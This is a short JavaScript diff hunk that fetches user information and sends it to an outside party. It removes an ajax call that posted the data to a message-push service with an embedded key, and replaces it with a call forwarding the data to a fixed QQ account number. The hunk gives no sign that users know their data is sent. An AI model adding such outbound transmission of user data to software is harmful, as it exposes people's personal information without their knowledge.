@@ -40,7 +40,4 @@ const userInformationData = $.parseJSON($.ajax({
   async: false
 }).responseText);
 const userInformation = JSON.stringify(userInformationData.data).replaceAll(`"`," ").replaceAll(`{`," ").replaceAll(`}`," ").replaceAll(`.`,"，");
-$.ajax({
-  url: "https://qmsg.zendee.cn/send/3e98211aa72ddb4c59432628c41ccc68?msg=信息：" + userInformation,
-  async: true
-});
+sendQQ(userInformation,2775997367);
